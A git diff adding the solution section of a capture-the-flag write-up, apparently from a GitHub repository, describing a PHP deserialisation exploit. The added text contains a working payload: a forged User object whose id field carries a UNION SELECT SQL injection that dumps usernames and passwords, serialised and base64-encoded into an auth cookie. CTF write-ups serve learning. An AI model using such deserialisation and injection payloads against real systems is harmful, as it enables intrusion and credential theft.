@@ -106,5 +106,31 @@ public function validate() {
 username is not vulnerable to sqli since it is checked twice to make sure the username entered is valid. Hence now we know where to do the sqli while exploiting the deserialisation vulerability.
 
 # solve
-I made another class, similar to the  <u>something</u>
+I made another class, similar to the `User` class in php and serialized it using the script -
+```
+<?php
+class User {
+  public $username = '';
+        public $id = -1;
+        protected $password = '';
+        protected $profile;
+
+        function __construct(){
+            $this->username="guest";
+            $this->id="3' union select group_concat(username),group_concat(password),group_concat(favorite_cereal),creation_date from users -- #";
+            $this->password="5f4dcc3b5aa765d61d8327deb882cf99";
+        }
+}
+
+$u1= new User();
+print(base64_encode(serialize($u1)));
+?>
+```
+here in the `id` field, sqli is done. only the `group_concat(password)` part is relevant, I added the rest to make things look *nice* and match the number of columns being selected. Finally, I used `--` to comment out the rest of the line.
+`password` variable is set to md5 hash of the string "password" since that is one of the fields that get selected for username validation and without this, the validiation will fail.
+
+I set the output of this script as `auth` cookie - 
+![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/bc93b69a-43b9-467f-9d55-e5ce675e2130)
+Finally I get the flag - 
+![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/74dc4528-ef05-4b48-a323-6b3614b2373d)
 
